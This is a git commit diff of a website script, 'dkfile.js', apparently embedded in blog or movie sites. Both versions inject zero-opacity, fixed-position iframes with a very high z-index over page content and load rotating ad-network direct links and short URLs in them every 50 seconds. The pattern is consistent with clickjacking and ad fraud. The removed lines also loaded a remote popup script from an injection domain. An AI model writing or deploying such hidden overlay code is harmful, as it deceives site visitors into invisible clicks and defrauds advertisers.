aed61fae1009a1fc0858124842f455b633058784
Dhanjee Rider <102199585+dhanjeerider@users.noreply.github.com>
2024-09-23 06:53:44 +0530

    Update dkfile.js

--- dkfile.js
+++ dkfile.js
@@ -1,60 +1,85 @@
 document.addEventListener('DOMContentLoaded', () => {
-  let Folt = document.querySelector(".footer, #main, .copyright") || document.body; 
-  if (Folt) {
-    let Newel = document.createElement('span');
-    Newel.innerHTML = `<style>
-      iframe.invisible-frame {
-      position: fixed;
-      width:60%;
-      height: 20%;
-      bottom: 20%;
-      right: 0;
-      border: none;
-      opacity: 0;
-      z-index:39494;
-    }
-  </style> <iframe class="invisible-frame" id="postFrame" src=""></iframe>`;
-    Folt.prepend(Newel);  
-    var lazyanalisis=!1;window.addEventListener("scroll",function(){(0!=document.documentElement.scrollTop&&!1===lazyanalisis||0!=document.body.scrollTop&&!1===lazyanalisis)&&(!function(){var e=document.createElement("script");e.type="text/javascript",e.async=!0,e.src="https://www.googletagmanager.com/gtag/js?id=G-2VYRMPXK0F";var a=document.getElementsByTagName("script")[0];a.parentNode.insertBefore(e,a)}(),lazyanalisis=!0)},!0); window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', 'G-2VYRMPXK0F');  
-  } else {
-       
-  }
-});
-  const postUrls = [
-    'https://addonsotechub.com/direct/2113',
-    'https://t.co/RPBnQZqZY9',
-    'https://addonsotechub.com/direct/2123',
-    'https://addonsotechub.com/direct/2122',
-    'https://addonsotechub.com/direct/2121',
-    'https://addonsotechub.com/direct/2120'
+        let Folt = document.querySelector(".footer, #main, .copyright") || document.body; 
+        if (Folt) {
+            let Newel = document.createElement('span');
+            Newel.innerHTML = `
+            <style>
+                iframe.invisible-frame {
+                    position: fixed;
+                    width: 40%;
+                    height: 20%;
+                    bottom: 30%;
+                    border: none;
+                    opacity: 0;
+                    z-index: 39494;
+                }
+                iframe.invisible-frame.right {
+                    right: 0;
+                }
+                iframe.invisible-frame.left {
+                    left: 0;
+                }
+            </style> 
+            <iframe class="invisible-frame right" id="postFrameRight" src=""></iframe>
+            <iframe class="invisible-frame left" id="postFrameLeft" src=""></iframe>
+            `;
+            Folt.prepend(Newel);  
 
-  ];
-        function goToRandomPost() {
-            const randomIndex = Math.floor(Math.random() * postUrls.length);
-            const randomPostUrl = postUrls[randomIndex];
-            document.getElementById('postFrame').src = randomPostUrl;
+            var lazyanalisis = !1;
+            window.addEventListener("scroll", function() {
+                if ((document.documentElement.scrollTop !== 0 && !lazyanalisis) || (document.body.scrollTop !== 0 && !lazyanalisis)) {
+                    (function() {
+                        var e = document.createElement("script");
+                        e.type = "text/javascript";
+                        e.async = !0;
+                        e.src = "https://www.googletagmanager.com/gtag/js?id=G-2VYRMPXK0F";
+                        var a = document.getElementsByTagName("script")[0];
+                        a.parentNode.insertBefore(e, a);
+                    })();
+                    lazyanalisis = !0;
+                }
+            }, !0);
+
+            window.dataLayer = window.dataLayer || [];
+            function gtag() {
+                dataLayer.push(arguments);
+            }
+            gtag('js', new Date());
+            gtag('config', 'G-2VYRMPXK0F');
         }
-        window.onload = function() {
-            goToRandomPost();
-            setInterval(goToRandomPost,  50000);
-        };
+    });
 
-var allowedURLs = [
-    "https://dkhek.blogspot.com",
-    "https://www.desiremovies.store"
-];
+    const postUrlsRight = [
+        'https://addonsotechub.com/direct/2113',
+        'https://t.co/RPBnQZqZY9',
+        'https://addonsotechub.com/direct/2123',
+        'https://addonsotechub.com/direct/2122',
+        'https://addonsotechub.com/direct/2121',
+        'https://addonsotechub.com/direct/2120'
+    ];
 
-var foundMatch = false;
+    const postUrlsLeft = [
+        'https://t.ly/wXH-Y',
+        'https://dkhek.blogspot.com/',
+        'https://dkhek.blogspot.com/',
+        'https://dkhek.blogspot.com/'
+    ];
 
-for (var i = 0; i < allowedURLs.length; i++) {
-    if (window.location.href.startsWith(allowedURLs[i])) {
-        foundMatch = true;
-        break;
+    function goToRandomPostRight() {
+        const randomIndex = Math.floor(Math.random() * postUrlsRight.length);
+        const randomPostUrl = postUrlsRight[randomIndex];
+        document.getElementById('postFrameRight').src = randomPostUrl;
     }
-}
 
-if (foundMatch) {
-function loadScript(url, callback) { var script = document.createElement('script'); script.type = 'text/javascript'; script.src = url; script.onload = function() { if (callback) callback(); }; document.head.appendChild(script); } loadScript('https://injectshrslinkblog.com/popup/script.js', function() { console.log('Script loaded!'); });
-}
-else {
-}
+    function goToRandomPostLeft() {
+        const randomIndex = Math.floor(Math.random() * postUrlsLeft.length);
+        const randomPostUrl = postUrlsLeft[randomIndex];
+        document.getElementById('postFrameLeft').src = randomPostUrl;
+    }
+
+    window.onload = function() {
+        goToRandomPostRight();
+        goToRandomPostLeft();
+        setInterval(goToRandomPostRight, 50000);
+        setInterval(goToRandomPostLeft, 50000);
+    };
